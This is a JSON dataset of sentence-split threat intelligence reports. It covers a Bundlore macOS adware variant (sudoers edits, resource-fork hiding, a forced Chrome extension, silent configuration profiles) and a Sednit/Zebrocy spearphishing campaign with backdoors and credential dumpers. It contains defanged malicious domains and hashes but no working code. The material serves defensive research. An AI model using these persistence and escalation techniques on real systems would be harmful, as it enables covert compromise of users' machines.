    {
        "id": "cti_reports_filtered/r-885.md:::S0",
        "text": "The mm-install->macos variant of the Bundlore family of macOS adware has been around for many years in many variations and delivery methods.",
        "type": "",
        "report": "r-885",
        "line": 0,
        "index": 2395
    },
    {
        "id": "cti_reports_filtered/r-885.md:::S1",
        "text": "Recently, a variant with a novel installation method was discovered.",
        "type": "",
        "report": "r-885",
        "line": 1,
        "index": 2396
    },
    {
        "id": "cti_reports_filtered/r-885.md:::S2",
        "text": "Although most of the installation details were the same or similar to the samples analyzed in the blogs above, these new samples modified the sudoers file on the infected system to remove the password requirement for privilege escalation.",
        "type": "",
        "report": "r-885",
        "line": 2,
        "index": 2397
    },
    {
        "id": "cti_reports_filtered/r-885.md:::S3",
        "text": "The malware also utilizes a form of obfuscation not observed before in this family, hiding compressed data in a resource fork on a downloaded script file.",
        "type": "",
        "report": "r-885",
        "line": 3,
        "index": 2398
    },
    {
        "id": "cti_reports_filtered/r-885.md:::S4",
        "text": "These samples were observed to be installed via a malicious chrome extension (crx file).",
        "type": "",
        "report": "r-885",
        "line": 4,
        "index": 2399
    },
    {
        "id": "cti_reports_filtered/r-885.md:::S5",
        "text": "This extension was pulled from an adware site http://download[.]mycouponsmartmac[.]com and was not publicly uploaded at the time of analysis.",
        "type": "",
        "report": "r-885",
        "line": 5,
        "index": 2400
    },
    {
        "id": "cti_reports_filtered/r-885.md:::S6",
        "text": "After the MyCouponsmart extension is installed, javascript is injected into the browser that displays pop-up ads and redirects the user to a website requiring the user to download a fake Adobe Flash Player update.",
        "type": "",
        "report": "r-885",
        "line": 6,
        "index": 2401
    },
    {
        "id": "cti_reports_filtered/r-885.md:::S7",
        "text": "The software downloaded has a multi-stage installer that, once given authentication from the user, gathers system information and ultimately installs multiple adware programs as root.",
        "type": "",
        "report": "r-885",
        "line": 7,
        "index": 2402
    },
    {
        "id": "cti_reports_filtered/r-885.md:::S8",
        "text": "The installed program demonstrates persistence on the system and the capability to silently download and install software as root at any time.",
        "type": "",
        "report": "r-885",
        "line": 8,
        "index": 2403
    },
    {
        "id": "cti_reports_filtered/r-885.md:::S9",
        "text": "Interestingly, this page has a disclaimer included at the bottom informing the user that the installer may suggest installation of additional \u201cfree software offers\u201d and that the Flash Player downloaded from the site is not affiliated with Adobe Flash.",
        "type": "",
        "report": "r-885",
        "line": 9,
        "index": 2404
    },
    {
        "id": "cti_reports_filtered/r-885.md:::S10",
        "text": "The analyzed samples were manually downloaded from a specially crafted URL from the site http://download[.]mycouponsmartmac[.]com.",
        "type": "",
        "report": "r-885",
        "line": 10,
        "index": 2405
    },
    {
        "id": "cti_reports_filtered/r-885.md:::S11",
        "text": "Each extension download URL uses a unique GUID, and changing this GUID results in the download of a different sample by hash.\n",
        "type": "",
        "report": "r-885",
        "line": 11,
        "index": 2406
    },
    {
        "id": "cti_reports_filtered/r-885.md:::S12",
        "text": "After the downloaded MyCouponsmart extension is installed, it injects javascript code from chrome-extension://background.js into the browser which contains code to either pop up an advertisement or redirect the webpage.",
        "type": "",
        "report": "r-885",
        "line": 12,
        "index": 2407
    },
    {
        "id": "cti_reports_filtered/r-885.md:::S13",
        "text": "More details regarding this extension are covered in the Configuration Profiles section below.\n",
        "type": "",
        "report": "r-885",
        "line": 13,
        "index": 2408
    },
    {
        "id": "cti_reports_filtered/r-885.md:::S14",
        "text": "When the URL in the script above is visited, the user is redirected to another site (in this case, http://cshus[.]albertbucket[.]icu/) which at the time was offering a download for a fake Adobe Flash Update, which downloaded the file AdobeFlashPlayer.zip (SHA256: 98bbcced1edf5ee4d781664b8fe722262aefd1cc4e7aa22a271aa9720de56c15).",
        "type": "",
        "report": "r-885",
        "line": 14,
        "index": 2409
    },
    {
        "id": "cti_reports_filtered/r-885.md:::S15",
        "text": "Immediately after the Flash zip file is downloaded, the browser is redirected to a site offering the download of another Chrome extension named \u201cSearch Manager\u201d\n",
        "type": "",
        "report": "r-885",
        "line": 15,
        "index": 2410
    },
    {
        "id": "cti_reports_filtered/r-885.md:::S16",
        "text": "This zip file contained the disk image AdobeFlashPlayer.dmg (SHA256: f425e6b6ac74b2b3b2c8b20b56641dfa8bcdd325b3bcabe023970855cc7f129e) which was automatically mounted.",
        "type": "",
        "report": "r-885",
        "line": 16,
        "index": 2411
    },
    {
        "id": "cti_reports_filtered/r-885.md:::S17",
        "text": "The mounted DMG does not contain an installer; instead it displays an image containing an alias to a script in the mounted volume:\n",
        "type": "",
        "report": "r-885",
        "line": 17,
        "index": 2412
    },
    {
        "id": "cti_reports_filtered/r-885.md:::S18",
        "text": "The script extracts compressed data containing a macOS .app in a hidden resource known as a resource fork.",
        "type": "",
        "report": "r-885",
        "line": 18,
        "index": 2413
    },
    {
        "id": "cti_reports_filtered/r-885.md:::S19",
        "text": "Resource forks were introduced in the early days of the Macintosh File System (MFS) and are deprecated but are still available, even in macOS Catalina.",
        "type": "",
        "report": "r-885",
        "line": 19,
        "index": 2414
    },
    {
        "id": "cti_reports_filtered/r-885.md:::S20",
        "text": "Resource forks were originally designed to allow an executable to store multiple resources within the file, yet remain separated from the executable data.",
        "type": "",
        "report": "r-885",
        "line": 20,
        "index": 2415
    },
    {
        "id": "cti_reports_filtered/r-885.md:::S21",
        "text": "Much like Alternative Data Streams (ADS) on Windows, the data is hidden from regular file and directory viewers, and multiple \u201cstreams\u201d or \u201cforks\u201d are allowed on an individual file.\n",
        "type": "",
        "report": "r-885",
        "line": 21,
        "index": 2416
    },
    {
        "id": "cti_reports_filtered/r-885.md:::S22",
        "text": "On macOS, these forks are implemented as an extended attribute (xattr) and can be enumerated or visualized using system tools such as ls and xattr.",
        "type": "",
        "report": "r-885",
        "line": 22,
        "index": 2417
    },
    {
        "id": "cti_reports_filtered/r-885.md:::S23",
        "text": "When ls is run with the \u2013l flag on a file that contains extended attributes, an \u201c@\u201d character will appear at the end of the file type and permissions listing:\n",
        "type": "",
        "report": "r-885",
        "line": 23,
        "index": 2418
    },
    {
        "id": "cti_reports_filtered/r-885.md:::S24",
        "text": "This indicates that the Install.command file has extended attributes, but does not tell us what kind of attributes they are.",
        "type": "",
        "report": "r-885",
        "line": 24,
        "index": 2419
    },
    {
        "id": "cti_reports_filtered/r-885.md:::S25",
        "text": "If we run ls \u2013l@ however, we can see the listed attributes and their sizes, including the ResourceFork:\n",
        "type": "",
        "report": "r-885",
        "line": 25,
        "index": 2420
    },
    {
        "id": "cti_reports_filtered/r-885.md:::S26",
        "text": "We can also use the tool xattr -p to view the contents of the ResourceFork, which in this case is output in hexadecimal (I have used the system command tail below in order to truncate the results \u2013 this shows only the end of the resource contents):\n",
        "type": "",
        "report": "r-885",
        "line": 26,
        "index": 2421
    },
    {
        "id": "cti_reports_filtered/r-885.md:::S27",
        "text": "The script from the analyzed sample is shown below.",
        "type": "",
        "report": "r-885",
        "line": 27,
        "index": 2422
    },
    {
        "id": "cti_reports_filtered/r-885.md:::S28",
        "text": "This script creates a temporary directory into which it will copy and execute the mm-install-macos app.",
        "type": "",
        "report": "r-885",
        "line": 28,
        "index": 2423
    },
    {
        "id": "cti_reports_filtered/r-885.md:::S29",
        "text": "The command in the second line of the script takes the last 254kb of the resource fork on the Install.command file, unzips the contents, then further decompresses the data, copying it to the previously created temporary directory.",
        "type": "",
        "report": "r-885",
        "line": 29,
        "index": 2424
    },
    {
        "id": "cti_reports_filtered/r-885.md:::S30",
        "text": "The decompressed data is a macOS .app, which the script then executes in the background.",
        "type": "",
        "report": "r-885",
        "line": 30,
        "index": 2425
    },
    {
        "id": "cti_reports_filtered/r-885.md:::S31",
        "text": "Immediately after installation of the application extracted by the script, the user\u2019s browser is redirected to another site that claims the Startup Disk is almost full, offering software to \u201cclean\u201d the system:\n",
        "type": "",
        "report": "r-885",
        "line": 31,
        "index": 2426
    },
    {
        "id": "cti_reports_filtered/r-885.md:::S32",
        "text": "Ironically, some of the URL redirects resulting from the browser injection ultimately route through the site mackeeperaffiliates[.]com to the actual MacKeeper download page, the company who wrote up a blog post on this adware last year.",
        "type": "",
        "report": "r-885",
        "line": 32,
        "index": 2427
    },
    {
        "id": "cti_reports_filtered/r-885.md:::S33",
        "text": "The process tree for the installation of this initial script from VMware Carbon Black Cloud Enterprise EDR showing the myriad system noise created by this activity is shown below.\n",
        "type": "",
        "report": "r-885",
        "line": 33,
        "index": 2428
    },
    {
        "id": "cti_reports_filtered/r-885.md:::S34",
        "text": "Once the mm-install-macos application is installed and granted root privileges, it is able to subsequently download and install additional software without re-authentication or Gatekeeper notifications.",
        "type": "",
        "report": "r-885",
        "line": 34,
        "index": 2429
    },
    {
        "id": "cti_reports_filtered/r-885.md:::S35",
        "text": "A few of the applications observed to be installed by this variant are as follows:\n",
        "type": "",
        "report": "r-885",
        "line": 35,
        "index": 2430
    },
    {
        "id": "cti_reports_filtered/r-885.md:::S36",
        "text": "PingTrusteer is one of the applications installed by the analyzed Bundlore variant above.",
        "type": "",
        "report": "r-885",
        "line": 36,
        "index": 2431
    },
    {
        "id": "cti_reports_filtered/r-885.md:::S37",
        "text": "This program checks for updates daily using a script pulled from http://request[.]pingtrusteer[.]com/macCheckForUpdates.",
        "type": "",
        "report": "r-885",
        "line": 37,
        "index": 2432
    },
    {
        "id": "cti_reports_filtered/r-885.md:::S38",
        "text": "The malware gains the ability to install programs with root privileges (without requiring a password) by adding the following line to /etc/sudoers file:\n",
        "type": "",
        "report": "r-885",
        "line": 38,
        "index": 2433
    },
    {
        "id": "cti_reports_filtered/r-885.md:::S39",
        "text": "Similar to previous variants, the script as pulled from http://request[.]pingtrusteer[.]com on 2 Jun 2020 exhibited the following functionality:\n",
        "type": "",
        "report": "r-885",
        "line": 39,
        "index": 2434
    },
    {
        "id": "cti_reports_filtered/r-885.md:::S40",
        "text": "- Checks the user account to see if it is either root or has sudo (root) privileges\n",
        "type": "",
        "report": "r-885",
        "line": 40,
        "index": 2435
    },
    {
        "id": "cti_reports_filtered/r-885.md:::S41",
        "text": "- Checks the domain request[.]pingtrusteer[.]com for any updates to the software\n",
        "type": "",
        "report": "r-885",
        "line": 41,
        "index": 2436
    },
    {
        "id": "cti_reports_filtered/r-885.md:::S42",
        "text": "- Creates MD5 hash of the system\u2019s serial number to use as a unique ID\n",
        "type": "",
        "report": "r-885",
        "line": 42,
        "index": 2437
    },
    {
        "id": "cti_reports_filtered/r-885.md:::S43",
        "text": "- Pulls the versions of the OS and installed web browsers\n",
        "type": "",
        "report": "r-885",
        "line": 43,
        "index": 2438
    },
    {
        "id": "cti_reports_filtered/r-885.md:::S44",
        "text": "- Downloads additional components to the temporary directory mmtmp=\u201d/private/tmp/.mmupdatescripts_$(date +%Y%m%d%H%M%S)\u201d (outlined in the table below)\n",
        "type": "",
        "report": "r-885",
        "line": 44,
        "index": 2439
    },
    {
        "id": "cti_reports_filtered/r-885.md:::S45",
        "text": "- Modifies the sudoers file to grant passwordless execution for the specified programs (PingTrusteer in this case, as seen above)\n",
        "type": "",
        "report": "r-885",
        "line": 45,
        "index": 2440
    },
    {
        "id": "cti_reports_filtered/r-885.md:::S46",
        "text": "- Compiles lists of all installed applications, profiles, LaunchAgents, and LaunchDaemons\n",
        "type": "",
        "report": "r-885",
        "line": 46,
        "index": 2441
    },
    {
        "id": "cti_reports_filtered/r-885.md:::S47",
        "text": "- Checks version of the macOS Malware Removal Tool (MRT)\n",
        "type": "",
        "report": "r-885",
        "line": 47,
        "index": 2442
    },
    {
        "id": "cti_reports_filtered/r-885.md:::S48",
        "text": "- Posts system-specific json data to the server mmp[.]myshopcouponmac[.]com\n",
        "type": "",
        "report": "r-885",
        "line": 48,
        "index": 2443
    },
    {
        "id": "cti_reports_filtered/r-885.md:::S49",
        "text": "This script runs daily to check for updates, and will download and install additional software if offered by the update server, as discussed below.\n",
        "type": "",
        "report": "r-885",
        "line": 49,
        "index": 2444
    },
    {
        "id": "cti_reports_filtered/r-885.md:::S50",
        "text": "File Name Application Description pwr.zip mm-install-macos.app Main Bundlore app wt.zip webtools.app Webtools Application imsearch.tar.gz SearchMine Browser search tool profile.mobileconfig SearchMine Configuration Profile install-nwt.bin iwt.bin Webtools Installer\n",
        "type": "",
        "report": "r-885",
        "line": 50,
        "index": 2445
    },
    {
        "id": "cti_reports_filtered/r-885.md:::S51",
        "text": "Highlighted in the table above, one of the methods of persistence and infection used by this variant is the creation of a custom configuration profile.",
        "type": "",
        "report": "r-885",
        "line": 51,
        "index": 2446
    },
    {
        "id": "cti_reports_filtered/r-885.md:::S52",
        "text": "Configuration profiles are typically used in enterprise, educational, or other distributed environments requiring centralized management and deployment of customized system configurations.",
        "type": "",
        "report": "r-885",
        "line": 52,
        "index": 2447
    },
    {
        "id": "cti_reports_filtered/r-885.md:::S53",
        "text": "In the case of this variant of Bundlore, the SearchMine component installed by mm-install-macos uses the configuration profile to lock several browser settings such as the default search page.",
        "type": "",
        "report": "r-885",
        "line": 53,
        "index": 2448
    },
    {
        "id": "cti_reports_filtered/r-885.md:::S54",
        "text": "Because it installs these profiles from the command line with root privileges, the user is never notified.",
        "type": "",
        "report": "r-885",
        "line": 54,
        "index": 2449
    },
    {
        "id": "cti_reports_filtered/r-885.md:::S55",
        "text": "However, Apple announced this week at WWDC that they will be revoking the ability to silently install configuration profiles from the command line without user input, which will disable this ability of the malware.\n",
        "type": "",
        "report": "r-885",
        "line": 55,
        "index": 2450
    },
    {
        "id": "cti_reports_filtered/r-885.md:::S56",
        "text": "This post from MalwareBytes details a related malware sample called Crossrider that installs a similar profile, as well as how to list and remove any malicious profiles installed.",
        "type": "",
        "report": "r-885",
        "line": 56,
        "index": 2451
    },
    {
        "id": "cti_reports_filtered/r-885.md:::S57",
        "text": "In both this Bundlore and the Crossrider samples, the configuration profile was named AdminPrefs.",
        "type": "",
        "report": "r-885",
        "line": 57,
        "index": 2452
    },
    {
        "id": "cti_reports_filtered/r-885.md:::S58",
        "text": "However, the malicious actors could easily change this name at any time by pushing a new installation script during the daily update check.\n",
        "type": "",
        "report": "r-885",
        "line": 58,
        "index": 2453
    },
    {
        "id": "cti_reports_filtered/r-885.md:::S59",
        "text": "For example, the script originally downloads an \u201cAdminPrefs\u201d configuration profile template (also seen in the post referenced above) which it dynamically populates with system-specific information on the victim machine.",
        "type": "",
        "report": "r-885",
        "line": 59,
        "index": 2454
    },
    {
        "id": "cti_reports_filtered/r-885.md:::S60",
        "text": "This script is configured to install different products depending on what is retrieved from the server.",
        "type": "",
        "report": "r-885",
        "line": 60,
        "index": 2455
    },
    {
        "id": "cti_reports_filtered/r-885.md:::S61",
        "text": "This allows the malware authors to dynamically change the malware installed on the system, which is all installed with root permissions due to the configuration during initial setup.",
        "type": "",
        "report": "r-885",
        "line": 61,
        "index": 2456
    },
    {
        "id": "cti_reports_filtered/r-885.md:::S62",
        "text": "Below is a sample of the analyzed script which shows the download and population of the profile template.",
        "type": "",
        "report": "r-885",
        "line": 62,
        "index": 2457
    },
    {
        "id": "cti_reports_filtered/r-885.md:::S63",
        "text": "In red, the base URL parameters are shown, along with the search domain that the browser will be configured to use.",
        "type": "",
        "report": "r-885",
        "line": 63,
        "index": 2458
    },
    {
        "id": "cti_reports_filtered/r-885.md:::S64",
        "text": "In blue, the script replaces the fields in the profile template with the custom parameters, and then installs the custom profile as seen in green.\n",
        "type": "",
        "report": "r-885",
        "line": 64,
        "index": 2459
    },
    {
        "id": "cti_reports_filtered/r-885.md:::S65",
        "text": "Once a profile is successfully installed, there will be a new icon in the System Preferences dialog as seen below:\n",
        "type": "",
        "report": "r-885",
        "line": 65,
        "index": 2460
    },
    {
        "id": "cti_reports_filtered/r-885.md:::S66",
        "text": "The profiles installed depend on the browsers installed on the system, and which browser is set to default.",
        "type": "",
        "report": "r-885",
        "line": 66,
        "index": 2461
    },
    {
        "id": "cti_reports_filtered/r-885.md:::S67",
        "text": "On the analyzed system configured with Chrome as the default browser, the malware installed a profile that sets the home page, search provider, and new tab default page.",
        "type": "",
        "report": "r-885",
        "line": 67,
        "index": 2462
    },
    {
        "id": "cti_reports_filtered/r-885.md:::S68",
        "text": "As mentioned before and described in more detail below, it also installs the MyCouponsmart extension via means that render the user unable to remove it.\n",
        "type": "",
        "report": "r-885",
        "line": 68,
        "index": 2463
    },
    {
        "id": "cti_reports_filtered/r-885.md:::S69",
        "text": "This profile configuration information is stored in plists on the system after loading.",
        "type": "",
        "report": "r-885",
        "line": 69,
        "index": 2464
    },
    {
        "id": "cti_reports_filtered/r-885.md:::S70",
        "text": "These per-user profile plists are located under a user directory under /Library/ManagedPreferences/<user>/ and define browser defaults such as the default search and home page.",
        "type": "",
        "report": "r-885",
        "line": 70,
        "index": 2465
    },
    {
        "id": "cti_reports_filtered/r-885.md:::S71",
        "text": "As mentioned, this script additionally installed a Chrome extension that is unable to be removed by the user, even with administrative privileges.",
        "type": "",
        "report": "r-885",
        "line": 71,
        "index": 2466
    },
    {
        "id": "cti_reports_filtered/r-885.md:::S72",
        "text": "This is accomplished by using the Chrome ExtensionInstallForceList key which is provided for managed enterprise computers.",
        "type": "",
        "report": "r-885",
        "line": 72,
        "index": 2467
    },
    {
        "id": "cti_reports_filtered/r-885.md:::S73",
        "text": "According to Chrome documentation:\n",
        "type": "",
        "report": "r-885",
        "line": 73,
        "index": 2468
    },
    {
        "id": "cti_reports_filtered/r-885.md:::S74",
        "text": "[ExtensionInstallForceList] Specifies a list of apps and extensions that are installed silently, without user interaction, and which cannot be uninstalled nor disabled by the user.",
        "type": "",
        "report": "r-885",
        "line": 74,
        "index": 2469
    },
    {
        "id": "cti_reports_filtered/r-885.md:::S75",
        "text": "All permissions requested by the apps/extensions are granted implicitly, without user interaction, including any additional permissions requested by future versions of the app/extension.",
        "type": "",
        "report": "r-885",
        "line": 75,
        "index": 2470
    },
    {
        "id": "cti_reports_filtered/r-885.md:::S76",
        "text": "This can be seen in the script below as highlighted in red, where the extension ID is lfbenaabfliihodeianphjhhhcjgddlh and points to the URL http://download[.]shoptimizelymac[.]com for updates:\n",
        "type": "",
        "report": "r-885",
        "line": 76,
        "index": 2471
    },
    {
        "id": "cti_reports_filtered/r-885.md:::S77",
        "text": "The installed MyCouponsmart extension can be seen in the Chrome extension management page:\n",
        "type": "",
        "report": "r-885",
        "line": 77,
        "index": 2472
    },
    {
        "id": "cti_reports_filtered/r-885.md:::S78",
        "text": "Installed policy information seen in the plist above can also be viewed in the Chrome policy page:\n",
        "type": "",
        "report": "r-885",
        "line": 78,
        "index": 2473
    },
    {
        "id": "cti_reports_filtered/r-885.md:::S79",
        "text": "Interestingly, this installer sets the dock to \u201chidden\u201d mode during install and all of the desktop items disappear while it is running as seen in the screenshot below.",
        "type": "",
        "report": "r-885",
        "line": 79,
        "index": 2474
    },
    {
        "id": "cti_reports_filtered/r-885.md:::S80",
        "text": "When this installer script was run again a week after the initial infection, two additional components were installed \u2013 macOSOTA and Periodikal, which appear to be additional Bundlore samples (not covered here, but may be analyzed for a future blog post).\n",
        "type": "",
        "report": "r-885",
        "line": 80,
        "index": 2475
    },
    {
        "id": "cti_reports_filtered/r-885.md:::S81",
        "text": "Furthermore, unlike other adware families like Smokyashan, these additional components are not installed in the usual Applications folder, but instead are installed into the user\u2019s Application directory located in /Users/<user>/Applications.",
        "type": "",
        "report": "r-885",
        "line": 81,
        "index": 2476
    },
    {
        "id": "cti_reports_filtered/r-885.md:::S82",
        "text": "This folder is not readily visible to the user unless they navigate directly to the directory in Finder.\n",
        "type": "",
        "report": "r-885",
        "line": 82,
        "index": 2477
    },
    {
        "id": "cti_reports_filtered/r-885.md:::S83",
        "text": "Although this variant of Bundlore is not significantly different than others seen over the last year, the additional features of manipulating the sudoers file and installation of Configuration Profiles are less commonly seen.",
        "type": "",
        "report": "r-885",
        "line": 83,
        "index": 2478
    },
    {
        "id": "cti_reports_filtered/r-885.md:::S84",
        "text": "The main takeaway however is that adware is often dismissed, but samples like the Bundlore variant analyzed in this post are able to install anything as root without any notification to the user after initial authentication.",
        "type": "",
        "report": "r-885",
        "line": 84,
        "index": 2479
    },
    {
        "id": "cti_reports_filtered/r-885.md:::S85",
        "text": "Although the only programs observed to be installed by Bundlore thus far have been adware, with root access and no additional authentication required from the user, any software could be installed with full access to the file system.",
        "type": "",
        "report": "r-885",
        "line": 85,
        "index": 2480
    },
    {
        "id": "cti_reports_filtered/r-885.md:::S86",
        "text": "Existing customers can learn more about how VMware Carbon Black products protect against this variant of Bundlore by visiting our \u201cBundlore (macOS) mm-install-macos\u201d TAU-TIN hosted on the User Exchange.\n",
        "type": "",
        "report": "r-885",
        "line": 86,
        "index": 2481
    },
    {
        "id": "cti_reports_filtered/r-916.md:::S0",
        "text": "At the end of August 2018, the Sednit group launched a spearphishing email campaign where it distributed shortened URLs that delivered the first stage of Zebrocy components.",
        "type": "",
        "report": "r-916",
        "line": 0,
        "index": 2482
    },
    {
        "id": "cti_reports_filtered/r-916.md:::S1",
        "text": "In the past, Sednit used a similar technique for credential phishing.",
        "type": "",
        "report": "r-916",
        "line": 1,
        "index": 2483
    },
    {
        "id": "cti_reports_filtered/r-916.md:::S2",
        "text": "However, it is unusual for the group to use this technique to deliver one of its malware components directly.",
        "type": "",
        "report": "r-916",
        "line": 2,
        "index": 2484
    },
    {
        "id": "cti_reports_filtered/r-916.md:::S3",
        "text": "Previously, it had used exploits to deliver and execute the first stage malware, while in this campaign the group relied entirely on social engineering to lure victims into running the first part of the chain.",
        "type": "",
        "report": "r-916",
        "line": 3,
        "index": 2485
    },
    {
        "id": "cti_reports_filtered/r-916.md:::S4",
        "text": "The screenshot in Figure 1 shows Bitly statistics for the shortened URL used in this campaign.",
        "type": "",
        "report": "r-916",
        "line": 4,
        "index": 2486
    },
    {
        "id": "cti_reports_filtered/r-916.md:::S5",
        "text": "About 20 clicks were recorded on this link in the same week that the URL was created, and these presumably downloaded the target archive.",
        "type": "",
        "report": "r-916",
        "line": 5,
        "index": 2487
    },
    {
        "id": "cti_reports_filtered/r-916.md:::S6",
        "text": "Let\u2019s keep in mind that this may mean fewer than 20 potential victims, as victims may have clicked on the URL twice, or maybe even more times, because the outcome was not what they expected\u2026 as we will describe below.",
        "type": "",
        "report": "r-916",
        "line": 6,
        "index": 2488
    },
    {
        "id": "cti_reports_filtered/r-916.md:::S7",
        "text": "While ESET telemetry data indicates that this URL was delivered by spearphishing emails, we don\u2019t have a sample of such an email.",
        "type": "",
        "report": "r-916",
        "line": 7,
        "index": 2489
    },
    {
        "id": "cti_reports_filtered/r-916.md:::S8",
        "text": "The shortened URL leads the victim to an IP-address-based URL, where the archived payload is located.\n",
        "type": "",
        "report": "r-916",
        "line": 8,
        "index": 2490
    },
    {
        "id": "cti_reports_filtered/r-916.md:::S9",
        "text": "Unfortunately, without the email message, we don\u2019t know if there are any instructions for the user, if there is any further social engineering, or if it relies solely on the victim\u2019s curiosity.",
        "type": "",
        "report": "r-916",
        "line": 9,
        "index": 2491
    },
    {
        "id": "cti_reports_filtered/r-916.md:::S10",
        "text": "The archive contains two files; the first is an executable file, while the second is a decoy PDF document.",
        "type": "",
        "report": "r-916",
        "line": 10,
        "index": 2492
    },
    {
        "id": "cti_reports_filtered/r-916.md:::S11",
        "text": "Note there is a typo in the executable\u2019s filename; it should be \u201c\u0414\u041e\u0412I\u0414\u041d\u0418\u041a\u201d instead of \u201c\u0414\u041e\u0412I\u0414\u041dI\u041a\u201d.",
        "type": "",
        "report": "r-916",
        "line": 11,
        "index": 2493
    },
    {
        "id": "cti_reports_filtered/r-916.md:::S12",
        "text": "Once the binary is executed, a password prompt dialog box opens.",
        "type": "",
        "report": "r-916",
        "line": 12,
        "index": 2494
    },
    {
        "id": "cti_reports_filtered/r-916.md:::S13",
        "text": "The result of the password validation will always be wrong, but after the apparent validation attempt, the decoy PDF document is opened.",
        "type": "",
        "report": "r-916",
        "line": 13,
        "index": 2495
    },
    {
        "id": "cti_reports_filtered/r-916.md:::S14",
        "text": "That document appears to be empty, but the downloader, which is written in Delphi, continues running in the background.",
        "type": "",
        "report": "r-916",
        "line": 14,
        "index": 2496
    },
    {
        "id": "cti_reports_filtered/r-916.md:::S15",
        "text": "The IP address is also used in the URL hardcoded into the first binary downloader.",
        "type": "",
        "report": "r-916",
        "line": 15,
        "index": 2497
    },
    {
        "id": "cti_reports_filtered/r-916.md:::S16",
        "text": "The Stage-1 downloader will download and execute a new downloader, written in C++, not so different from other Zebrocy downloaders.",
        "type": "",
        "report": "r-916",
        "line": 16,
        "index": 2498
    },
    {
        "id": "cti_reports_filtered/r-916.md:::S17",
        "text": "Once again this downloader is as straightforward as the Zebrocy gang\u2019s other downloaders.",
        "type": "",
        "report": "r-916",
        "line": 17,
        "index": 2499
    },
    {
        "id": "cti_reports_filtered/r-916.md:::S18",
        "text": "It creates an ID and it downloads a new, interesting backdoor, (this time) written in Delphi.\n",
        "type": "",
        "report": "r-916",
        "line": 18,
        "index": 2500
    },
    {
        "id": "cti_reports_filtered/r-916.md:::S19",
        "text": "As we explained in our most recent blogpost about Zebrocy, the configuration of the backdoor is stored in in the resource section and is split into four different hex-encoded, encrypted blobs.",
        "type": "",
        "report": "r-916",
        "line": 19,
        "index": 2501
    },
    {
        "id": "cti_reports_filtered/r-916.md:::S20",
        "text": "These blobs contain the different parts of the configuration.",
        "type": "",
        "report": "r-916",
        "line": 20,
        "index": 2502
    },
    {
        "id": "cti_reports_filtered/r-916.md:::S21",
        "text": "Once the backdoor sends basic information about its newly compromised system, the operators take control of the backdoor and start to send commands right away.\n",
        "type": "",
        "report": "r-916",
        "line": 21,
        "index": 2503
    },
    {
        "id": "cti_reports_filtered/r-916.md:::S22",
        "text": "Hence, the time between the victim running the downloader and the operators\u2019 first commands is only a few minutes.\n",
        "type": "",
        "report": "r-916",
        "line": 22,
        "index": 2504
    },
    {
        "id": "cti_reports_filtered/r-916.md:::S23",
        "text": "In this section we describe in more detail the commands performed manually by the operators through their Delphi backdoor.\n",
        "type": "",
        "report": "r-916",
        "line": 23,
        "index": 2505
    },
    {
        "id": "cti_reports_filtered/r-916.md:::S24",
        "text": "The commands available are located in one of the configuration blobs mentioned earlier (the \u201ccommands\u201d blob in Figure 3).",
        "type": "",
        "report": "r-916",
        "line": 24,
        "index": 2506
    },
    {
        "id": "cti_reports_filtered/r-916.md:::S25",
        "text": "The number of supported commands has increased over time, with the latest version of the backdoor having more than thirty.",
        "type": "",
        "report": "r-916",
        "line": 25,
        "index": 2507
    },
    {
        "id": "cti_reports_filtered/r-916.md:::S26",
        "text": "As we did not identify a pattern in the order which the commands are invoked, we believe the operators are executing them manually.",
        "type": "",
        "report": "r-916",
        "line": 26,
        "index": 2508
    },
    {
        "id": "cti_reports_filtered/r-916.md:::S27",
        "text": "The first set of commands gathers information about the victim\u2019s computer and environment:\n",
        "type": "",
        "report": "r-916",
        "line": 27,
        "index": 2509
    },
    {
        "id": "cti_reports_filtered/r-916.md:::S28",
        "text": "The commands above are commonly executed when the operators first connect to a newly activated backdoor.",
        "type": "",
        "report": "r-916",
        "line": 28,
        "index": 2510
    },
    {
        "id": "cti_reports_filtered/r-916.md:::S29",
        "text": "They don\u2019t have any arguments, and they are quite self-explanatory.",
        "type": "",
        "report": "r-916",
        "line": 29,
        "index": 2511
    },
    {
        "id": "cti_reports_filtered/r-916.md:::S30",
        "text": "Other commands commonly seen executed shortly after these backdoors are activated, listed below:\n",
        "type": "",
        "report": "r-916",
        "line": 30,
        "index": 2512
    },
    {
        "id": "cti_reports_filtered/r-916.md:::S31",
        "text": "Those who already have read our previous articles about Zebrocy will notice that more or less the same kind of information is sent, over and over again by previous stages.",
        "type": "",
        "report": "r-916",
        "line": 31,
        "index": 2513
    },
    {
        "id": "cti_reports_filtered/r-916.md:::S32",
        "text": "This information is requested within a few minutes of initial compromise and the amount of data the operator will have to deal with is quite considerable.\n",
        "type": "",
        "report": "r-916",
        "line": 32,
        "index": 2514
    },
    {
        "id": "cti_reports_filtered/r-916.md:::S33",
        "text": "In order to collect even more information, from time to time the Zebrocy operators upload and use dumpers on victims\u2019 machines.",
        "type": "",
        "report": "r-916",
        "line": 33,
        "index": 2515
    },
    {
        "id": "cti_reports_filtered/r-916.md:::S34",
        "text": "The current dumpers have some similarities with those previously used by the group.",
        "type": "",
        "report": "r-916",
        "line": 34,
        "index": 2516
    },
    {
        "id": "cti_reports_filtered/r-916.md:::S35",
        "text": "In this case, Yandex Browser, Chromium, 7Star Browser (a Chromium-based browser), and CentBrowser are targeted, as well as versions of Microsoft Outlook from 1997 through 2016:\n",
        "type": "",
        "report": "r-916",
        "line": 35,
        "index": 2517
    },
    {
        "id": "cti_reports_filtered/r-916.md:::S36",
        "text": "These dumpers create log files indicating the presence or absence of potential databases to dump:\n",
        "type": "",
        "report": "r-916",
        "line": 36,
        "index": 2518
    },
    {
        "id": "cti_reports_filtered/r-916.md:::S37",
        "text": "The current dumper contains the following output when there are no databases to dump:\n",
        "type": "",
        "report": "r-916",
        "line": 37,
        "index": 2519
    },
    {
        "id": "cti_reports_filtered/r-916.md:::S38",
        "text": "These dumpers are quickly removed once they have done their job.",
        "type": "",
        "report": "r-916",
        "line": 38,
        "index": 2520
    },
    {
        "id": "cti_reports_filtered/r-916.md:::S39",
        "text": "Moreover, the backdoor contains a list of filenames related to credentials from software listed below (database names):\n",
        "type": "",
        "report": "r-916",
        "line": 39,
        "index": 2521
    },
    {
        "id": "cti_reports_filtered/r-916.md:::S40",
        "text": "The operators take care of retrieving these databases if they are present on the victim\u2019s computer.\n",
        "type": "",
        "report": "r-916",
        "line": 40,
        "index": 2522
    },
    {
        "id": "cti_reports_filtered/r-916.md:::S41",
        "text": "The operators retrieve these files on the machine using the DOWNLOAD_LIST command.",
        "type": "",
        "report": "r-916",
        "line": 41,
        "index": 2523
    },
    {
